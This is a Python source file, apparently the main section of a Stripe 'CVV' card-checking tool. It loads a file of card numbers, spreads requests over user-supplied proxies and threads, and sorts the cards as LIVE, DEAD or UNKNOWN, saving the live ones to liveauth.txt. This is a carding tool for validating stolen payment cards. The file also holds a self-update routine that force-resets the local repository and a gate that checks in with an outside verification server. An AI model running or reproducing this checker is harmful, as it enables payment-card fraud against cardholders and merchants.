        f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Contact {Fore.LIGHTCYAN_EX}: {Fore.YELLOW}t.me/xqndrs"
    )

    print("- " * 35)
    path = input(
        f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Enter card file path (ex: {Fore.CYAN}card.txt{Style.RESET_ALL}): {Fore.CYAN}"
    ).strip()
    try:
        with open(path, "r", encoding="utf-8") as f:
            cards = [line.strip() for line in f if line.strip()]
            cards = list(dict.fromkeys(cards))
    except FileNotFoundError:
        print(
            f"\n{Fore.RESET}[{Fore.LIGHTRED_EX}ERROR{Fore.RESET}] File not found: {Fore.LIGHTRED_EX}{path}\n"
        )
        return
    except UnicodeDecodeError:
        print(
            "\n{Fore.RESET}[{Fore.LIGHTRED_EX}ERROR{Fore.RESET}] File must be in {Fore.RESET}UTF-8 {Fore.RESET}encoding.\n"
        )
        return
    except KeyboardInterrupt:
        sys.exit(1)

    if not cards:
        print(
            f"\n{Fore.RESET}[{Fore.LIGHTRED_EX}ERROR{Fore.RESET}] No card data found in {Fore.LIGHTRED_EX}{path}\n"
        )
        return
    print(
        f"{Fore.LIGHTCYAN_EX}[!] {Fore.LIGHTRED_EX}Note: {Fore.YELLOW}Comma separated, ex: user:pass@ip:port, ip:port:user:pass{Style.RESET_ALL}"
    )

    proxy_input = input(
        f"{Fore.LIGHTCYAN_EX}[+] {Fore.LIGHTWHITE_EX}Paste ur proxy kredensials {Style.RESET_ALL}"
        f"{Fore.LIGHTBLACK_EX}[Press Enter to skip]{Style.RESET_ALL}: {Fore.CYAN}"
    ).strip()

    proxy_list = load_proxy_list(proxy_input)
    if proxy_list:
        print(f"{Fore.CYAN}[✓]{Style.RESET_ALL} Loaded {len(proxy_list)} proxies.")
    else:
        print(
            f"{Fore.YELLOW}[!] No proxy entered or no valid proxies loaded. Continuing without proxy.{Style.RESET_ALL}"
        )

    try:
        user_threads = input(
            f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Enter number of threads (max {Fore.LIGHTCYAN_EX}{THREADS_MAX}{Style.RESET_ALL}, "
            f"default {Fore.LIGHTRED_EX}{DEFAULT_THREADS}{Style.RESET_ALL}): {Fore.CYAN}"
        ).strip()

        n = int(user_threads) if user_threads else DEFAULT_THREADS

        if n < THREADS_MIN:
            print(
                f"\n{Fore.RESET}[{Fore.LIGHTYELLOW_EX}WARN{Fore.RESET}] Minimum threads is {THREADS_MIN}. "
                f"Using default {DEFAULT_THREADS}.{Style.RESET_ALL}"
            )
            threads = DEFAULT_THREADS
        elif n > THREADS_MAX:
            print(
                f"\n{Fore.RESET}[{Fore.LIGHTYELLOW_EX}WARN{Fore.RESET}] Max threads is {THREADS_MAX}. "
                f"Using {THREADS_MAX} threads.{Style.RESET_ALL}"
            )
            threads = THREADS_MAX
        else:
            threads = n

    except ValueError:
        print(
            f"\n{Fore.RESET}[{Fore.LIGHTYELLOW_EX}WARN{Fore.RESET}] Invalid input. "
            f"Using default {DEFAULT_THREADS} threads.{Style.RESET_ALL}"
        )
        threads = DEFAULT_THREADS
    except KeyboardInterrupt:
        sys.exit(1)

    cnt_live = cnt_dead = cnt_unknown = 0
    res = []

    start = time.perf_counter()
    os.system("cls" if os.name == "nt" else "clear")
    banner = pyfiglet.figlet_format("STRIPE", font="stop")
    colors = [Fore.CYAN, Fore.MAGENTA, Fore.BLUE]
    print(gradient_text(banner, colors))
    print_info()
    print("- " * 35)
    print(
        f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Author {Fore.LIGHTCYAN_EX}: {Fore.YELLOW}Kiansantang DEV"
    )
    print(
        f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Github {Fore.LIGHTCYAN_EX}: {Fore.YELLOW}github.com/KianSantang777"
    )
    print(
        f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Contact {Fore.LIGHTCYAN_EX}: {Fore.BLUE}t.me/xqndrs"
    )
    print(
        f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Total card {Fore.CYAN}: {Fore.YELLOW}{len(cards)}{Style.RESET_ALL}"
    )
    if proxy_list:
        print(
            f"{Fore.CYAN}[✓]{Fore.LIGHTWHITE_EX} Use {Fore.YELLOW}{len(proxy_list)} {Fore.LIGHTWHITE_EX}proxies."
        )
    else:
        print(
            f"{Fore.YELLOW}[x] {Fore.LIGHTWHITE_EX}No proxy entered or no valid proxies loaded. Continuing without proxy.{Style.RESET_ALL}"
        )
    print(
        f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Total threads {Fore.CYAN}: {Fore.YELLOW}{threads}{Style.RESET_ALL}"
    )
    print(
        f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Max retry {Fore.CYAN}: {Fore.YELLOW}5{Style.RESET_ALL}"
    )
    print(
        f"{Fore.LIGHTCYAN_EX}[▪︎] {Fore.LIGHTWHITE_EX}Live card saved to {Fore.CYAN}: {Fore.LIGHTGREEN_EX}liveauth.txt{Style.RESET_ALL}"
    )
    print("- " * 35)

    try:
        with requests.Session() as sess:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                jobs = {
                    ex.submit(check, card, sess, proxy_list): card for card in cards
                }
                for fut in as_completed(jobs):
                    card = jobs[fut]
                    result = fut.result()
                    if not isinstance(result, tuple) or len(result) != 2:
                        r, stat = None, None
                    else:
                        r, stat = result

                    if stat is True:
                        res.append((card, f"{Fore.LIGHTGREEN_EX}LIVE{Style.RESET_ALL}"))
                        cnt_live += 1
                    elif stat is False:
                        res.append((card, f"{Fore.LIGHTRED_EX}DEAD{Style.RESET_ALL}"))
                        cnt_dead += 1
                    else:
                        res.append(
                            (card, f"{Fore.LIGHTYELLOW_EX}UNKNOWN{Style.RESET_ALL}")
                        )
                        cnt_unknown += 1

    except KeyboardInterrupt:
        sys.exit(1)

    elapsed = time.perf_counter() - start
    print("\n", "- " * 35)
    print(
        f"{Style.RESET_ALL}DONE. Checked {Fore.CYAN}{len(cards)}{Style.RESET_ALL} cards in {Fore.CYAN}{elapsed:.2f} {Style.RESET_ALL}seconds."
    )
    print(
        f"RESULTS: {Fore.LIGHTGREEN_EX}LIVE: {Style.RESET_ALL}{cnt_live}, {Fore.LIGHTRED_EX}DEAD: {Style.RESET_ALL}{cnt_dead}, {Fore.LIGHTYELLOW_EX}UNKNOWN: {Style.RESET_ALL}{cnt_unknown}\n\n"
    )


def _run(cmd, *, check=True):
    r = subprocess.run(cmd, text=True, capture_output=True)
    if check and r.returncode != 0:
        raise RuntimeError(f"{' '.join(cmd)} -> {r.returncode}\n{r.stderr.strip()}")
    return r.stdout.strip()


def self_update_from_git() -> None:
    try:
        _run(["git", "rev-parse", "--is-inside-work-tree"])
        before = _run(["git", "rev-parse", "HEAD"])
    except Exception as e:
        print(f"[SELF-UPDATE] Skip (not a git repo?): {e}")
        return

    try:
        _run(["git", "fetch", "--all", "--prune"])

        try:
            _run(["git", "pull", "--rebase", "--autostash"])
        except Exception as e_pull:
            print(f"[SELF-UPDATE] pull failed, trying hard reset: {e_pull}")

            upstream = None
            try:
                upstream = _run(
                    ["git", "rev-parse", "--abbrev-ref", "--symbolic-full-name", "@{u}"]
                )
            except Exception:
                pass
            if not upstream:
                try:
                    _run(
                        [
                            "git",
                            "show-ref",
                            "--verify",
                            "--quiet",
                            "refs/remotes/origin/main",
                        ]
                    )
                    upstream = "origin/main"
                except Exception:
                    pass
            if not upstream:
                try:
                    _run(
                        [
                            "git",
                            "show-ref",
                            "--verify",
                            "--quiet",
                            "refs/remotes/origin/master",
                        ]
                    )
                    upstream = "origin/master"
                except Exception:
                    pass

            if not upstream:
                print("[SELF-UPDATE] No upstream found. Skip update.")
            else:
                try:
                    _run(["git", "reset", "--hard", upstream])
                    _run(["git", "clean", "-fd"])
                except Exception as e_reset:
                    print(f"[SELF-UPDATE] hard reset failed: {e_reset}")

        after = _run(["git", "rev-parse", "HEAD"])
        if before == after:
            print("[SELF-UPDATE] Up to date.")
            return

        print(f"[SELF-UPDATE] Updated: {before[:7]} -> {after[:7]}. Restarting...")

        for stopper in ("stop_autoupdate", "stop_heartbeat"):
            try:
                mod = sys.modules.get("__main__") or sys.modules[__name__]
                func = getattr(mod, stopper, None)
                if callable(func):
                    func(join=False)
            except Exception:
                pass

        os.execv(sys.executable, [sys.executable] + sys.argv)

    except Exception as e:
        pass


if __name__ == "__main__":
    try:
        self_update_from_git()
    except:
        pass

    if "--showcase" in sys.argv:
        showcase_all()
        sys.exit(0)

    init(label="STRIPE-CVV", endpoints=["https://verif.stecu.cloud"], heartbeat_sec=5)

    if not gate(ui_style="v7"):
        sys.exit(1)

    try:
        main()
        pass
    finally:
        stop_heartbeat(join=True)
